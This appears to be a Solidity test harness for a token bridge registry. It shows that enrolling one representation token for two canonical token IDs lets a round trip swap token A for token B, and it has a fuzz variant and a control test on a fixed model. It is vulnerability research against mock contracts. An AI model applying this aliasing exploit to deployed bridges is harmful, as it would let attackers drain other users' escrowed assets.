// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {
    BridgeRouterAliasModel,
    MockCanonicalBridgeToken,
    MockRepresentationBridgeToken,
    TokenRegistryAliasBugModel,
    TokenRegistryAliasFixedModel
} from "../src/TokenRegistryAliasSwapHarness.sol";

contract TokenRegistryAliasSwapTest {
    uint32 internal constant REMOTE_DOMAIN = 1000;
    uint32 internal constant LOCAL_DOMAIN = 2000;

    function _assertTrue(bool _condition, string memory _message) internal pure {
        require(_condition, _message);
    }

    function _id(address _token) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(_token)));
    }

    function _amount(uint256 _seed) internal pure returns (uint256) {
        return (_seed % 1000 ether) + 1;
    }

    function _deployBugPair()
        internal
        returns (
            TokenRegistryAliasBugModel localRegistry,
            TokenRegistryAliasBugModel remoteRegistry,
            BridgeRouterAliasModel localRouter,
            BridgeRouterAliasModel remoteRouter,
            MockCanonicalBridgeToken tokenA,
            MockCanonicalBridgeToken tokenB,
            MockRepresentationBridgeToken custom
        )
    {
        localRegistry = new TokenRegistryAliasBugModel(LOCAL_DOMAIN);
        remoteRegistry = new TokenRegistryAliasBugModel(REMOTE_DOMAIN);
        localRouter = new BridgeRouterAliasModel(address(localRegistry));
        remoteRouter = new BridgeRouterAliasModel(address(remoteRegistry));
        localRouter.setRemote(address(remoteRouter));
        remoteRouter.setRemote(address(localRouter));

        tokenA = new MockCanonicalBridgeToken();
        tokenB = new MockCanonicalBridgeToken();
        custom = new MockRepresentationBridgeToken(address(localRouter));

        localRegistry.enrollCustom(REMOTE_DOMAIN, _id(address(tokenA)), address(custom));
        localRegistry.enrollCustom(REMOTE_DOMAIN, _id(address(tokenB)), address(custom));

        uint256 seed = 5_000_000 ether;
        remoteRouter.seedCanonicalEscrow(address(tokenA), seed);
        remoteRouter.seedCanonicalEscrow(address(tokenB), seed);
        tokenA.mint(address(this), seed);
        tokenA.approve(address(remoteRouter), type(uint256).max);
    }

    function _deployFixedPair()
        internal
        returns (
            TokenRegistryAliasFixedModel localRegistry,
            TokenRegistryAliasFixedModel remoteRegistry,
            BridgeRouterAliasModel localRouter,
            BridgeRouterAliasModel remoteRouter,
            MockCanonicalBridgeToken tokenA,
            MockCanonicalBridgeToken tokenB,
            MockRepresentationBridgeToken custom
        )
    {
        localRegistry = new TokenRegistryAliasFixedModel(LOCAL_DOMAIN);
        remoteRegistry = new TokenRegistryAliasFixedModel(REMOTE_DOMAIN);
        localRouter = new BridgeRouterAliasModel(address(localRegistry));
        remoteRouter = new BridgeRouterAliasModel(address(remoteRegistry));
        localRouter.setRemote(address(remoteRouter));
        remoteRouter.setRemote(address(localRouter));

        tokenA = new MockCanonicalBridgeToken();
        tokenB = new MockCanonicalBridgeToken();
        custom = new MockRepresentationBridgeToken(address(localRouter));

        localRegistry.enrollCustom(REMOTE_DOMAIN, _id(address(tokenA)), address(custom));

        uint256 seed = 5_000_000 ether;
        remoteRouter.seedCanonicalEscrow(address(tokenA), seed);
        remoteRouter.seedCanonicalEscrow(address(tokenB), seed);
        tokenA.mint(address(this), seed);
        tokenA.approve(address(remoteRouter), type(uint256).max);
    }

    /// @notice End-to-end witness:
    /// aliasing one representation address across token IDs allows cross-asset swap A->B.
    function test_aliased_custom_representation_swaps_asset_id_on_roundtrip() public {
        (
            TokenRegistryAliasBugModel localRegistry,
            ,
            BridgeRouterAliasModel localRouter,
            BridgeRouterAliasModel remoteRouter,
            MockCanonicalBridgeToken tokenA,
            MockCanonicalBridgeToken tokenB,
            MockRepresentationBridgeToken custom
        ) = _deployBugPair();

        uint256 amount = 250 ether;
        uint256 tokenABefore = tokenA.balanceOf(address(this));
        uint256 tokenBBefore = tokenB.balanceOf(address(this));

        remoteRouter.send(address(tokenA), amount, address(this));
        _assertTrue(
            custom.balanceOf(address(this)) == amount,
            "expected representation mint"
        );

        (uint32 domainForwarded, bytes32 idForwarded) = localRegistry.getTokenId(
            address(custom)
        );
        _assertTrue(domainForwarded == REMOTE_DOMAIN, "wrong forwarded domain");
        _assertTrue(
            idForwarded == _id(address(tokenB)),
            "aliased representation should forward as tokenB"
        );

        localRouter.send(address(custom), amount, address(this));

        _assertTrue(
            tokenB.balanceOf(address(this)) == tokenBBefore + amount,
            "attacker should receive tokenB"
        );
        _assertTrue(
            tokenA.balanceOf(address(this)) + amount == tokenABefore,
            "attacker should lose tokenA amount"
        );
    }

    /// @notice Fixed control: second enroll of same representation for different token ID is blocked.
    function test_fixed_model_blocks_representation_alias_and_preserves_asset_id()
        public
    {
        (
            TokenRegistryAliasFixedModel localRegistry,
            ,
            BridgeRouterAliasModel localRouter,
            BridgeRouterAliasModel remoteRouter,
            MockCanonicalBridgeToken tokenA,
            MockCanonicalBridgeToken tokenB,
            MockRepresentationBridgeToken custom
        ) = _deployFixedPair();

        bool reverted;
        try localRegistry.enrollCustom(REMOTE_DOMAIN, _id(address(tokenB)), address(custom)) {
            reverted = false;
        } catch {
            reverted = true;
        }
        _assertTrue(reverted, "fixed model should reject alias enroll");

        uint256 amount = 100 ether;
        uint256 tokenABefore = tokenA.balanceOf(address(this));
        uint256 tokenBBefore = tokenB.balanceOf(address(this));

        remoteRouter.send(address(tokenA), amount, address(this));
        _assertTrue(
            custom.balanceOf(address(this)) == amount,
            "expected fixed representation mint"
        );

        (uint32 domainForwarded, bytes32 idForwarded) = localRegistry.getTokenId(
            address(custom)
        );
        _assertTrue(domainForwarded == REMOTE_DOMAIN, "wrong forwarded domain");
        _assertTrue(
            idForwarded == _id(address(tokenA)),
            "fixed mapping should preserve tokenA id"
        );

        localRouter.send(address(custom), amount, address(this));

        _assertTrue(
            tokenA.balanceOf(address(this)) == tokenABefore,
            "tokenA should round-trip back"
        );
        _assertTrue(
            tokenB.balanceOf(address(this)) == tokenBBefore,
            "tokenB should remain unchanged"
        );
    }

    /// @notice Fuzz witness: alias-driven cross-asset swap remains for varied amounts.
    function testFuzz_bug_alias_swap_amount(uint96 amountSeed) public {
        (
            ,
            ,
            BridgeRouterAliasModel localRouter,
            BridgeRouterAliasModel remoteRouter,
            MockCanonicalBridgeToken tokenA,
            MockCanonicalBridgeToken tokenB,
            MockRepresentationBridgeToken custom
        ) = _deployBugPair();

        uint256 amount = _amount(amountSeed);
        uint256 tokenABefore = tokenA.balanceOf(address(this));
        uint256 tokenBBefore = tokenB.balanceOf(address(this));

        remoteRouter.send(address(tokenA), amount, address(this));
        localRouter.send(address(custom), amount, address(this));

        _assertTrue(
            tokenB.balanceOf(address(this)) == tokenBBefore + amount,
            "tokenB gain mismatch"
        );
        _assertTrue(
            tokenA.balanceOf(address(this)) + amount == tokenABefore,
            "tokenA loss mismatch"
        );
    }
}
